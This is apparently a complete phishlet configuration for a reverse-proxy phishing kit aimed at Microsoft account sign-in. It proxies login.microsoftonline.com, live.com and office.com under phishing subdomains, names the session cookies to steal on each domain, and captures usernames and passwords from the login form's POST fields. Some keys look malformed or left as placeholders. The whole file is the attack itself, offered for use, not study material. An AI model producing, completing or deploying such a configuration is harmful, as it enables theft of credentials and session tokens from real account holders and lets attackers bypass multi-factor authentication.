min ver: '3.2.0'

proxy hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'logon', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}

sub filters:
auth tokens:
  - domain: '.live.com' # domain that sends the cookie
    keys: ['.*regexp'] # name of cookie to steal
  - domain: 'live.com'
    keys: ['.*regexp']
  - domain: 'login.live.com'
    keys: ['.*regexp']
  - domain: 'login.live.com'
    keys: ['.*regexp']
  - domain: 'login.microsoftonline.com'
    keys: ['.*regexp']
  - domain: 'login.microsoftonline.com'
    keys: ['.*regexp']
  - domain: 'microsoft.com'
    keys: ['.*regexp']
  - domain: 'microsoft.com'
    keys: ['.*regexp']
  - domain: 'office.com'
    keys: ['.*regexp']
  - domain: 'office.com'
    keys: ['.*regexp']
  - domain: 'www.office.com'
    keys: ['.*regexp']
  - domain: 'www.office.com'
    keys: ['.*regexp']

auth urls:
  - ./landingv2

credentials:
  username:
    key: 'login'
    search: ' (.*)'  # regex in the event the data needs to be extracted. This generic example.
    type: 'post'
  password:
    key: 'passwd'
    search: ' (.*)'
    type: 'post'

login:
  domain: 'login.microsoftonline.com'
  path: '/'  # path to where the login is, on the domain.
